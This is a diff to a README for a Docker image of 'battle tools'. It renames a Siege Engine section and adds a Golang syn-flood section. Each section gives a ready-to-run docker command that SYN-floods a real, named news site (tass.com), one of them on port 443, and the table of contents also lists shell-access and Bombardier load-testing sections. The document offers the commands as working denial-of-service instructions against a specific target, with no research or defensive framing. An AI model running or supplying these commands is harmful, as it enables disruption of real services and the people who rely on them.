@@ -10,7 +10,8 @@
 - [Use](#use)
   - [Wireguard](#wireguard)
   - [Use tools/get shell](#use-toolsget-shell)
-  - [Siege Engine](#siege-engine)
+  - [Siege Engine (syn flood)](#siege-engine-syn-flood)
+  - [Golang syn-flood](#golang-syn-flood)
   - [Bombardier](#bombardier)
 
 # Important
@@ -61,10 +62,16 @@ Ensure that you have exported variables from [Run](#run) according to your hosti
 ssh ${a_user}@${a_ip}
 ```
 
-## Siege Engine
+## Siege Engine (syn flood)
 Tool for SYN flood, [ref](https://github.com/smok-serwis/siege-engine)
 ```
 docker run --rm -it mack/battle-tools python3 -m siege_engine 300 tass.com
+```
+
+## Golang syn-flood
+Tool for SYN flood, [ref](https://github.com/bilalcaliskan/syn-flood)
+```
+docker run --rm -it mack/battle-tools syn-flood --port 443 --host tass.com
 ```
 
 ## Bombardier
